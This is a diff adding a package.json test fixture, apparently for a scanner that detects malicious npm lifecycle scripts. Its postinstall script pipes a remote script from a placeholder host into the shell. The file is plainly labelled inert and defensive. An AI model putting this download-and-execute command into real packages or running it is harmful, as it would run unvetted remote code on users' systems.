@@ -1,0 +1,9 @@
+{
+  "name": "vaultdao-lifecycle-fixture",
+  "private": true,
+  "version": "0.0.0",
+  "description": "INERT FIXTURE: simulates a malicious npm postinstall lifecycle script for scanner self-test. Never installed or executed.",
+  "scripts": {
+    "postinstall": "curl -s https://example.invalid/payload.sh | sh"
+  }
+}
